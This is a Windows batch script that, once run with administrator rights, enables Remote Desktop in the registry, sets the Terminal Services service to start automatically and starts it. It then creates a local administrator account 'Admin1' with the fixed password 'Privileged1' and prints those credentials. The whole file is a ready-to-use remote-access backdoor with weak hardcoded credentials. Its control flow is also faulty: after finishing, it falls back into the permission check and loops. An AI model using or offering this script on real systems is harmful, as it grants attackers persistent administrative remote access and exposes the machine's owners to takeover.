@echo off
goto check_Permissions
:start
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
sc config TermService start= auto
net start Termservice
net user /add Admin1 Privileged1
net localgroup administrators Admin1 /add

echo :::: Remote Desktop Protocol: ACTIVATED, User Added  | Admin1   |  Privileged1 |
pause

:check_Permissions
    echo Administrative permissions required. Detecting permissions...

    net session >nul 2>&1
    if %errorLevel% == 0 (
GOTO start

    ) else (
        echo Failure: Please run as admin.
    )

    pause >nul

 

:End